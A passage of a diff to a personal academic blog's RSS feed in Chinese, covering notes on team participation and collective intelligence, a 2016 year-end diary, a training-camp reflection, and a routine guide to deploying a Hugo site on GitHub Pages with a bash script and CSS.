+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/c315dfd9d7cbab768b9c5615813d00df.png&#34; alt=&#34;overlap rate single size&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;结论：随着团队规模增加，团队内部的确变得多元化，有人频繁参与，有人则高强度参与，二者未必相同。的确可能出现大象🐘和老鼠🐭并存的情况。按照&lt;code&gt;“固定”任务空间&lt;/code&gt;的假设，在位者有累积优势（经验、任务分配、责任心），但人多了竞争激烈，也会给在位者带来冲击，尤其是大象的进入，他们可以靠少数的push，贡献大量的代码。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/71219d7043e62aed77d1761afceb73cf.png&#34; alt=&#34;water&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;水分不仅在活跃次数衡量的有效团队中发挥作用，同样在代码量衡量的有效团队中发挥作用，应该有点深刻的东西在这里。Lakhani (2011)发表在Management Science上的文章要回答一个问题&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:Lakhani&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:Lakhani&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;，像Netflix 这样的竞赛，团队多好还是少好？传统经济学理论认为参与团队越多，单个团队获奖概率越低，团队越没有积极性，平均表现越差。他们分析数据发现，扩大参赛团队数后，平均表现变差，但最强团队的表现变好。&lt;/p&gt;
+
+&lt;h2 id=&#34;参与的均匀性&#34;&gt;参与的均匀性&lt;/h2&gt;
+
+&lt;p&gt;昨天看了一点Alex &amp;lsquo;SANDY&amp;rsquo; Pentland的书social physics，关于如何合作Sandy有很多看似惊世骇俗的观点，其中提到team的collective intelligence他说social sensitivity、话轮的均匀性可以提到团队绩效（群体智慧），见Evidence for a Collective Intelligence Factor in the Performance of Human Groups一文，sandy还在哈佛商业评论吹了一通The New Science of Building Great Teams，强调face-to-face的团队互动、均匀的参与对于team performance的重要性：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;(Group intelligence) was negatively correlated with the variance in the number of speaking turns by group members.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;他们就用variance测量的参与的均匀程度，方差越小越好。variance越大，香农熵越大，m越大，m/M越大，绩效越低，与实际数据发现一致。&lt;/p&gt;
+
+&lt;h3 id=&#34;数据&#34;&gt;数据&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;arXiv bulk data access amazon S3&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;因公出国护照办理&#34;&gt;因公出国护照办理&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://wb.nju.edu.cn/zzbl/list.htm&#34; target=&#34;_blank&#34;&gt;http://wb.nju.edu.cn/zzbl/list.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;一、公务（普通）护照办理
+（一）办证要求
+1、在办结因公出国校内审批后，由申请者本人到仙林校区行政楼818室采集指纹，并提交以下材料：
+（1）身份证原件
+（2）身份证复印件（标明出生地所在省、直辖市或自治区名）
+（3）两寸白底彩照1张
+2、现无公务（普通）护照/护照过期/护照有效期不足（本次出访后，距护照到期不足6个月；部分国家所需有效期更长）
+（二）办理时间：1至2周（不含节假日）&lt;/p&gt;
+
+&lt;h3 id=&#34;因公出国人员申报流程及材料须知&#34;&gt;因公出国人员申报流程及材料须知&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://wb.nju.edu.cn/splc/list.htm&#34; target=&#34;_blank&#34;&gt;http://wb.nju.edu.cn/splc/list.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;因公临时出国人员根据“OA申报材料清单”,通过OA系统提交申报材料；&lt;/p&gt;
+
+&lt;h1 id=&#34;reference&#34;&gt;Reference&lt;/h1&gt;
+&lt;div class=&#34;footnotes&#34;&gt;
+
+&lt;hr /&gt;
+
+&lt;ol&gt;
+&lt;li id=&#34;fn:Sinatra&#34;&gt;Sinatra, R., Wang, D., Deville, P., Song, C., &amp;amp; Barabási, A. L. (2016). Quantifying the evolution of individual scientific impact. Science, 354(6312), aaf5239-aaf5239.
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:Sinatra&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:Guimer&#34;&gt;Guimerà R, Uzzi B, Spiro J, et al. Team Assembly Mechanisms Determine Collaboration Network Structure and Team Performance. Science, 2005, 308(5722):697-702
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:Guimer&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:Lakhani&#34;&gt;Boudreau, K. J., Lacetera, N., &amp;amp; Lakhani, K. R. (2011). Incentives and problem uncertainty in innovation contests: an empirical analysis. Management Science, 57(5), 843-863.
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:Lakhani&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>2016年总结</title>
+      <link>https://chengjun.github.io/en/note/2016-12-31-summary/</link>
+      <pubDate>Sat, 31 Dec 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2016-12-31-summary/</guid>
+      <description>&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/d79656403a9b53627af688a06c9a3432.png&#34; alt=&#34;leaf&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;宁在一思进，莫在一思停。&lt;/p&gt;
+
+&lt;p&gt;1月19日
+今天老爸回老家了，我要负责做饭了。压力好大。今天上午打车去仙林医院，说儿科只有周三周四上午才有，仙林鼓楼医院的儿科也只有内科，没有皮肤科。住在仙林，小孩看病还有去鼓楼儿童医院。往返打车画了61块钱。&lt;/p&gt;
+
+&lt;p&gt;1月20日&lt;/p&gt;
+
+&lt;p&gt;今天写了一点创业项目的基本情况，还差挺多的。卸载了好几个app，才安装了新版支付宝。今天上午我和暮白带着米粒去儿童医院，结果挂错科室了，转过去之后今天没号了，打电话给鼓楼医院不看14岁以下病人，只好去迈皋桥妇幼保健院。吃过淮南牛肉汤之后又折腾回来。&lt;/p&gt;
+
+&lt;p&gt;1月21日&lt;/p&gt;
+
+&lt;p&gt;下午趁着米粒睡着，我开始写了一点论文，看了会文献。突然想起，今天么有拿快递。唯有写作使人心安。&lt;/p&gt;
+
+&lt;p&gt;1月22日&lt;/p&gt;
+
+&lt;p&gt;team formation仅仅是group formation的一种类型，big team never expand，为什么我却觉得如此困难呢。因为我对这个领域可以验证的理论还不了解。我在过去的几年里学到的一点是，不管有多少人质疑一个有潜力的方向，作为年轻人你要做的不是插着腰加入他们，而是沿着那个方向做出有价值的东西，让他们闭嘴。年轻人要想出头，必须冒险。&lt;/p&gt;
+
+&lt;p&gt;1月22日&lt;/p&gt;
+
+&lt;p&gt;‘friends of friends’. 三角闭合显然是group formation的重要动力。写东西很像修行，你会被磨砺着动心忍性，不为所动，神思千里。&lt;/p&gt;
+
+&lt;p&gt;1月22日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;在达沃斯论坛，马云接受纽约时报专栏作家索尔金采访，提出三个30改变世界的观点 &lt;a href=&#34;http://weibo.com/1642634100/ErzQLt8yd?type=comment&#34; target=&#34;_blank&#34;&gt;http://weibo.com/1642634100/ErzQLt8yd?type=comment&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;1月23日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;Decision and hard work based on enduring passion will never fail you. Edward E. Wilson ​​​​&lt;/p&gt;
+
+&lt;p&gt;1月23日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;今天下午写到了6000字，争取今天写到8000字。一篇文章写十天，真实不容易。写到了六点多，才写了6800字。&lt;/p&gt;
+
+&lt;p&gt;1月23日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;今天下午写到了6000字，争取今天写到8000字。一篇文章写十天，真实不容易。写到了六点多，才写了6800字。写到晚上，写了7544字。&lt;/p&gt;
+
+&lt;p&gt;1月23日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;今天超过9700字了，其实正文只有8544字。&lt;/p&gt;
+
+&lt;p&gt;1月24日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;尤克里里完全入门24课 &lt;a href=&#34;http://list.youku.com/albumlist/show?id=18501294&amp;amp;ascending=1&amp;amp;page=1&#34; target=&#34;_blank&#34;&gt;http://list.youku.com/albumlist/show?id=18501294&amp;amp;ascending=1&amp;amp;page=1&lt;/a&gt;
+练习了一个小时，看了同名的视频和书，终于知道do re mi fa sol la ti do怎么弹了。&lt;/p&gt;
+
+&lt;p&gt;1月24日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;妈妈今天早上离开了，今天我和晓青在家看米粒。我要把论文审核一遍，发了邮件提交。松一口气。&lt;/p&gt;
+
+&lt;p&gt;1月25日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;1月31日，初四，今天去超市买了电池，给尤克里里调了弦，今天妈妈从老家回来，晚上自习看了F调音阶，弹了一会祝你生日快乐。&lt;/p&gt;
+
+&lt;p&gt;1月31日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;Ukulele零基础入门视频教程 &lt;a href=&#34;http://www.tanukulele.com/?tag=xsrm&#34; target=&#34;_blank&#34;&gt;http://www.tanukulele.com/?tag=xsrm&lt;/a&gt; &lt;a href=&#34;http://www.ukulelefan.com/?p=3432&#34; target=&#34;_blank&#34;&gt;http://www.ukulelefan.com/?p=3432&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;2月1日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;Ukulele零基础入门视频教程
+&lt;a href=&#34;http://www.tanukulele.com/?tag=xsrm&#34; target=&#34;_blank&#34;&gt;http://www.tanukulele.com/?tag=xsrm&lt;/a&gt;
+&lt;a href=&#34;http://www.ukulelefan.com/?p=3432&#34; target=&#34;_blank&#34;&gt;http://www.ukulelefan.com/?p=3432&lt;/a&gt;
+&lt;a href=&#34;http://rockv.net/e/action/ShowInfo.php?classid=40&amp;amp;id=208&#34; target=&#34;_blank&#34;&gt;http://rockv.net/e/action/ShowInfo.php?classid=40&amp;amp;id=208&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;2月1日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;下载team science的文章，From Solo Investigator to Team Scientist: Trends in the Practice and Study of Research Collaboration，发现很多其他的文章。team science这是一个被广泛关注的领域，已经积累了大量的工作在里面。&lt;/p&gt;
+
+&lt;p&gt;2月1日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;子曰：“知之者不如好之者，好之者不如乐之者。” 子曰：“知者乐水，仁者乐山；知者动，仁者静；知者乐，仁者寿。”  [礼物] 王知乐 [心] 名字的来源。&lt;/p&gt;
+
+&lt;p&gt;2月3日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;越来越感觉到重要的是你急切的想要做什么，否则就会丧失战斗力。 ​​​​&lt;/p&gt;
+
+&lt;p&gt;2月6日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;science也曾说将github作为研究的一环，来开放代码，这个是否可以识别出来呢？&lt;/p&gt;
+
+&lt;p&gt;2月6日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;把合作的图做到claim的高度，方便团队成员理解。&lt;/p&gt;
+
+&lt;p&gt;2月10日回复顶转发&lt;/p&gt;
+
+&lt;p&gt;愈发感觉到我是一个肤浅的人，对于做网站天然没有抵抗力。或许，骨子里是想做得更好，让别人看到眼前一亮。其实是一种无奈的求胜的欲望。失去抵抗力，几乎飞蛾扑火地搞了个人新网站之后却依旧感觉少了点什么，什么呢？显摆的东西啊！因为没有成果，所以还是要滚去写论文啊。放弃是一种很无奈的事情，总是期待能够拾起来。另外就是学到东西。&lt;/p&gt;
+
+&lt;p&gt;2016年就这么过去了，我也已经32岁了，变成了大叔，胖得有些可恶，面目狰狞，内心可憎。青椒两年半了，不知道未来会怎样，生出莫名的烦恼。青椒是一段非常折磨人的时光。家庭、论文、项目、教学，一股脑全来了。我的博士四年多多少少是失败的，略高于平均水平吧。生活也是一样，暮白和我对现状都不满意。我们对于南京市没有一丁点儿的归属感。赶上了这个城市狂飙突进式的房价飞涨，就像玩一个比大小的游戏，一轮输掉之后就完全挤不进去了。对于南京市政府卖地度日的虚假繁荣，我感到非常无语。大城市的发展瓶颈开始凸显出来，过去的人文文化、教育优势、医疗优势，在资本主义的房地产市场面前变得非常无力。工作和博后的生活相比混杂了太多。心态不一样了，干的事情也不一样了，唯有忍耐。或许一切都有点晚，2015年做的最正确的事情是买了句容的房子，否则就要漂泊在南京三年了；而做的最错误的事情是没有及时买南京的房子。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;2014年是转折之年&lt;/code&gt;，实习、毕业、结婚、暮白怀孕、工作，全在这一年。&lt;code&gt;2015年是危机之年&lt;/code&gt;，因为自己没有什么收获，几乎一无所获，还要在行政类的工作中颠簸。2015年米粒出生了；申请了国家社科项目；买了九曲花苑的房子；卷入了智库的工作。&lt;code&gt;2016年是转机之年&lt;/code&gt;，我和令飞的3篇东西陆续出来，和crystal合作的东西也出来了。搬到宝华后忙着装修房子。松了一口气之后，还没缓过来，暮白又怀孕了。&lt;/p&gt;
+
+&lt;p&gt;米粒已经21个月了，她进入了人生当中的叛逆期，执着于融入三岁少年的群体，迷恋&lt;code&gt;游乐场&lt;/code&gt;、游戏机，&lt;a href=&#34;http://www.iqiyi.com/a_19rrhai7jd.html?vfm=2008_aldbd&#34; target=&#34;_blank&#34;&gt;小老虎丹尼尔&lt;/a&gt;。管教米粒的时候，我意识到自己非常没有耐心，非常粗鲁。&lt;/p&gt;
+
+&lt;iframe frameborder=&#34;no&#34; border=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; width=&#34;330&#34; height=&#34;86&#34; src=&#34;http://music.163.com/outchain/player?type=2&amp;id=784553&amp;auto=0&amp;height=66&#34;&gt; &lt;/iframe&gt;
+
+&lt;p&gt;&lt;strong&gt;从松散到紧凑&lt;/strong&gt; 最近这段时间过着猪一样的生活，也没有照顾米粒，一个人晚上睡书房、看电视剧，人也没有精神，不想对着电脑工作，经常看电视，欠了一堆工作没有做。我需要一种可以持续紧凑的生活方式。要牢记：没有危机感就是最大的危机，认为人会懈怠！&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/c120a0afca363631e723b122d1080bfa.png&#34; alt=&#34;sijin&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;博士后办理落户&lt;/strong&gt; 费劲心力，终于办理了博士后落户。对于南京大学的集体户口，我只能说没有任何诚意。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;涂鸦&lt;/strong&gt; 米粒周岁之后，经常给她临摹一些小画，画的都很普通，还不如希特勒的水平，聊以自娱。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;懦弱的拖延症&lt;/strong&gt; 开始陷入了严重的拖延症。当我无法克服困难的时候，就会陷入这种拖延症，开始做别的事情打发时间，结果就更浪费时间了。想到这里，我就会觉得自己太不给力，也太自私了。我觉得问题是自己懦弱的性格。2016年大年初二，去了红山动物园，米粒妈妈感冒了。今年马上也要开学了，回首这段时间我可以说是一无所成。我不知道为什么，我陷入了这种绝境，这段时间确实不好过。时间总在看手机、看米粒的碎片过程中过去了。writing a lot给了我很多启发：任务要小，不要一口吃个胖子，有明确的步骤和要求，比如写完50个字。循序渐进。流动的状态，乐而忘忧废寝忘食，这是做自己擅长的事情的体验。比如我编写程序的时候，克服一个个具体的小问题。写作是第一生产。首先写作，然后其他。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;要更有意义的学习和生活！&lt;/strong&gt; 【2016-07-16】知道自己前进的方向非常重要。每天练习四组平板撑对于自己非常有帮助，这个和健腹轮有异曲同工之妙。加油！⛽️ 【2016-08-02】这个平板撑的计划根本没有实行下去。体育锻炼是我青椒三年的噩梦吧。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;年终奖&lt;/strong&gt;年终奖评奖标准主要看上课、带学生、发论文、主持讲座活动（绩效）。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/de6b12b8f802196b47273dae12d6f0c1.png&#34; alt=&#34;yearly-award&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;骗子公司Lambert图书出版&lt;/strong&gt; 最终放弃了lambert的出版计划，主要是它们实质是一个骗子公司，并不对书籍进行任何有价值的编辑工作。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;计算传播学论坛&lt;/strong&gt; 小可老师提了几个会议改进方案，非常有启发，与大家分享：- 增加期刊合作，推荐期刊发表；- 稿件被接收者可以选择自己承担差旅费用+领取会议补贴 或者 由会议承担差旅而不提供会议补贴；- 会议延长为两天，第一天为工作坊时间，安排网络科学家为传播学研究者讲网络科学的研究方法，或者传播学者为网络科学研究者讲社会科学的理论和方法；第二天为主题发言+分组讨论。基于研究项目的合作计划：合作计划的目标就是促进跨学科的合作，吸引其他学科、其他学校学者的注意力，将研究项目尽快转化为研究成果。在无法引进人才的条件下，依然可以“为我所用”。成功合作的基础在于匹配双方的利益，尤其是在数据、资金、论文署名三个方面，达到最大化的效果。- 找到双方都关注的研究问题和好的数据是吸引合作者的第一步。- 提供适当的资金补助是必要的一环。- 双方在论文署名方面按照通行的规则。- 明确项目需求，比如共同发表几篇国际论文。&lt;/p&gt;
+
+&lt;p&gt;合作计划分为两个阶段：项目合作、访问计划。- 项目合作：这是合作的初级阶段，我方提供问题和数据，双方一起参与，共同分析，承担写作的一方一般为一作。- 访问计划：针对具体的项目和数据，组织短期的访问项目，时间长度为1-2个月，主要任务为共同讨论和动手解决数据分析和研究设计问题。- 第一个阶段项目合作是广撒网，访问计划是精准定位。二者可以结合项目合作+访问计划。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;百度阅读研究计划&lt;/strong&gt; 研究问题和视角：本研究试图从网络科学的角度分析用户的注意力如何在书籍构成的人类知识版图当中流动。研究方法：构建以书籍为节点、以用户的阅读行为为链接的人类阅读行为的注意力流动网络。同时，每一天构建一个注意力流动网络，这样可以观察到每一天的活跃用户数量和阅读规模，进而可以分析用户的数量（UV）和用户的浏览量（PV）之间的异速增长关系。研究意义：基于这个网络可以观察到人类在知识获取过程，将书籍嵌入到一个流动网络所对应的几何空间中，进而可以进行节点的聚类，计算任意两个节点的相似性，划分以书籍为单位的知识版图的层级关系。数据需求：1. 数据抽样：- 首先，从总体当中随机抽取10万用户；- 然后，对于每一个用户抽取2016年1月1日到6月30日之间的所有阅读行为记录。格式如下：用户id、时间、书籍id、阅读量（字数等指标）、持续时间（秒钟）- 此外，抽取这10万用户所阅读的所有的图书的基本信息，例如：书籍id、书名、作者、出版社、年份、定价，等。- 最后，对于这10万用户的图书购买行为进行记录，格式如下：用户id、时间、书籍id、花费金额。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/67d2a8bc0f1dca86a4cf4d541574e518.png&#34; alt=&#34;elephant_smoking&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>记凯风-集智训练营</title>
+      <link>https://chengjun.github.io/en/note/2016-10-13-swarma-camp/</link>
+      <pubDate>Thu, 13 Oct 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2016-10-13-swarma-camp/</guid>
+      <description>
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/ed6c9d46333416093c4d0fd0e9712dc4.png&#34; alt=&#34;缪斯&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;二十一世纪的科学&#34;&gt;二十一世纪的科学&lt;/h3&gt;
+
+&lt;p&gt;邓肯*瓦茨在2007年的时候写了一篇名为《二十一世纪的科学》的文章，提出了”二十一世纪的科学“的概念。瓦茨认为二十一世纪的科学不是自然科学，而是社会科学。因为社会科学涉及到了海量的异质化个体之间的互动，所以研究社会科学所面临的挑战特别大；但是基于数字化媒体（如互联网、手机）等手段收集的人类行为数据则为这种研究提供了丰富的数据。类似这种视角，Lazer等人（2009）更完整地表达为”计算社会科学”研究的思路。基于计算社会科学的研究思路为分析社会现象（尤其是人类传播行为）提供了丰富的可能性，因而我们见证了最近十年里的社会科学的飞跃。&lt;/p&gt;
+
+&lt;p&gt;但是计算社会科学的发展思路依然留下了很多问题，比如如何来把握不同学科的资源来发展计算社会科学。研究者习惯于使用韦恩图来表达这种跨学科的研究的特点，比如讲数据科学表达为科学（一个领域的知识）、统计、机器学习等算法三个领域的重叠。我自己越来越倾向于认为计算社会科学是社会科学的领域知识、物理学模型、计算机算法三个领域的重叠。但是这种重叠不是完全平等的重合。因为几乎没有一个人可以熟练地掌握三个领域的知识，这种人非常罕见，因而可以称之为“独角兽”。多数人其实只是在一个方面发展得比较好，比如传统的社会科学研究者其实是对本领域的知识方面比较了解，而对于计算机算法和物理学模型方面则有所欠缺。这个时候有两个平行的发展思路：一个是扬长避短、一个是取长补短。&lt;/p&gt;
+
+&lt;p&gt;在读博士等初级阶段往往是一个取长补短的这样一个阶段，这个时候的研究者往往广泛涉猎其它学科的知识，尤其是物理学的理论模型和计算机算法的知识，所以可以说这是一个做加法的过程。但是科学研究往往是在一个点上突破的，为了论文发表，研究者必须要有所取舍，不可能什么都去研究，后者会导致研究者非常疲惫。持之以恒的将研究兴趣聚焦于一个点就是一个做减法的过程。这往往出现在科研职业的阶段当中。当你博士毕业进入到了一个职业阶段，你就必须考虑聚焦兴趣、做减法。&lt;/p&gt;
+
+&lt;p&gt;我个人正是经历了这样的一个先做加法后做减法的过程。读博士的时候对各种编程语言和工具感兴趣，广泛地接触各种计算机方面的基础知识。但这也是一个让人疲惫的阶段，因为种种原因，我们不断地被吸引到各种看似非常有吸引力的话题上面，于是出现注意力耗散的现象（当然，你不学习看电影其实也很累），这些都是不利于发表的。当你进入研究的职业生涯之后，你就不许考虑产出的问题，被迫地做减法。我一直觉得或许此后也将处于做减法的过程，将自己的研究聚焦于可以产出论文的领域，知道参加了第一届“凯风-集智训练营”。&lt;/p&gt;
+
+&lt;h3 id=&#34;凯风-集智训练营&#34;&gt;凯风-集智训练营&lt;/h3&gt;
+
+&lt;p&gt;2016年集智俱乐部与凯风合作，组织了第一届“凯风-集智训练营”，这次训练营于2016年10月7日集合，10月12日结束，10月13日训练营正式结束。&lt;/p&gt;
+
+&lt;h3 id=&#34;作为团队的微信群&#34;&gt;作为团队的微信群&lt;/h3&gt;
+
+&lt;p&gt;将微信群看为一个知识分享的团队，不同团队的类型。我们假设存在着一个有效团队， 这里面存在着一种集体智慧，是一个crowdsoucing众包的过程，团队的成功，活跃性。Pentland所思考的是团队内部的沟通。规模和消息数量，指数增加。贡献的有效，这个和团队的绩效或者成功是不容易的。引用带来成功！&lt;/p&gt;
+
+&lt;p&gt;解决业务问题，搞营销和赚钱，推荐系统。创新的扩散。进群的过程。关键节点，群的影响力最大化。&lt;/p&gt;
+
+&lt;p&gt;激活微信群&lt;/p&gt;
+
+&lt;p&gt;知识传播、流动网络&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Github个人网站维护</title>
+      <link>https://chengjun.github.io/en/note/2016-08-03-github/</link>
+      <pubDate>Wed, 03 Aug 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2016-08-03-github/</guid>
+      <description>
+
+&lt;h2 id=&#34;hugo-on-github&#34;&gt;Hugo on github&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Create on GitHub &lt;code&gt;mywebsite-hugo&lt;/code&gt; repository (it will host Hugo’s content)&lt;/li&gt;
+&lt;li&gt;Create on GitHub &lt;code&gt;chengjun.github.io&lt;/code&gt; repository (it will host the public folder: the static website)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cd github&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;git clone https://github.com/chengjun/mywebsite-hugo.git&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hugo new site mywebsite-hugo --force&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cd mywebsite-hugo&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;download &lt;a href=&#34;https://github.com/gcushen/hugo-academic/archive/master.zip&#34; target=&#34;_blank&#34;&gt;Academic&lt;/a&gt; and extract it into a themes/academic folder within your Hugo website.&lt;/li&gt;
+&lt;li&gt;If you are creating a new website, copy the contents of the exampleSite folder to your website root folder, overwriting existing files if necessary.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hugo server --watch&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Once you are happy with the results, &lt;code&gt;Ctrl+C&lt;/code&gt; (kill server) and &lt;code&gt;rm -rf public&lt;/code&gt; (don’t worry, it can always be regenerated with hugo -t &lt;yourtheme&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;git submodule add https://github.com/chengjun/chengjun.github.io.git public --force&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Almost done: add a deploy.sh script to help you&lt;/li&gt;
+&lt;li&gt;and make it executable: &lt;code&gt;chmod +x deploy.sh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;./deploy.sh &amp;quot;Your optional commit message&amp;quot;&lt;/code&gt; to send changes to &lt;username&gt;.github.io (careful, you may also want to commit changes on the &lt;your-project&gt;-hugo repo).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+
+echo -e &amp;quot;\033[0;32mDeploying updates to GitHub...\033[0m&amp;quot;
+
+# Build the project.
+hugo # if using a theme, replace by `hugo -t &amp;lt;yourtheme&amp;gt;`
+
+# Go To Public folder
+cd ..
+
+cd chengjun.github.io
+
+cp -av /Users/chengjun/github/mywebsite-hugo/public/* .
+
+
+# Add changes to git.
+git add -A
+
+# Commit changes.
+msg=&amp;quot;rebuilding site `date`&amp;quot;
+if [ $# -eq 1 ]
+  then msg=&amp;quot;$1&amp;quot;
+fi
+git commit -m &amp;quot;$msg&amp;quot;
+
+# Push source and build repos.
+git push origin master
+
+# Come Back
+cd ..
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;domain-name&#34;&gt;domain name&lt;/h2&gt;
+
+&lt;p&gt;在godaddy上花了122块钱买了两年的域名 &lt;a href=&#34;http://chengjunwang.com&#34; target=&#34;_blank&#34;&gt;chengjunwang.com&lt;/a&gt;。简单设置cname和goddy上的a record和cname www record就好了。主要参考了&lt;a href=&#34;http://andrewsturges.com/blog/jekyll/tutorial/2014/11/06/github-and-godaddy.html&#34; target=&#34;_blank&#34;&gt;这里&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;我对于html的无知可以说是到了某种无以附加的程度。虽然我投入了很多时间，但往往都是干中学。而不是系统的模仿。通常会发现很多困惑，然后每次对我而言都是一个个小trick就解决了问题。&lt;/p&gt;
+
+&lt;h2 id=&#34;平行的文本框&#34;&gt;平行的文本框&lt;/h2&gt;
+
+&lt;p&gt;如何添加一个平行的文本框？这个困惑了我很久的问题，解决方法是设置position为absolute。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#textbox {
+  position:absolute;
+  top: 200px;
+  width: auto;
+  margin-left: 50px;
+  background-color: rgba(0,0,0,0.2);
+  opacity:1;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;修改之后又觉得不好看。又尝试了iframe，也不是很合适。&lt;/p&gt;
+
+&lt;p&gt;之后发现一篇好文章&lt;a href=&#34;http://css-tricks.com/examples/ShapesOfCSS/&#34; target=&#34;_blank&#34;&gt;The Shapes of CSS&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;修改了其中的talkbubble，放在application.css中。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#talkbubble {
+   position:absolute;
+   top: 250px;
+   margin-left: 50px;
+   width: 300px;
+   height: 150px;
+   background-color: rgba(0,0,0,0.2);
+   -moz-border-radius:    10px;
+   -webkit-border-radius: 10px;
+   border-radius:         10px;
+}
+#talkbubble:before {
+   content:&amp;quot;&amp;quot;;
+   position: absolute;
+   margin-left: 300px;
+   top: 80px;
+   width: 0;
+   height: 0;
+   background-color: transparent;
+   #border-top: 5px solid transparent;
+   border-bottom: 30px solid rgba(0,0,0,0.2);
+   border-right: 120px solid transparent;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在index.html里加入talkbubble来显示新闻。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;talkbubble&amp;quot;&amp;gt;
+  &amp;lt;h2&amp;gt;&amp;lt;a href=&amp;quot;http://chengjun.github.io/cv/news.html&amp;quot;&amp;gt;News&amp;lt;/a&amp;gt;&amp;lt;/h2&amp;gt;
+  &amp;lt;p&amp;gt;[Feb 23] &amp;lt;a href=&amp;quot;https://pypi.python.org/pypi/scholarNetwork/&amp;quot;&amp;gt;scholarNetwork&amp;lt;/a&amp;gt;--a python package which can help crawl and visualize the coauthor network of Google Scholar is released to Pypi. &amp;lt;/p&amp;gt;
+&amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
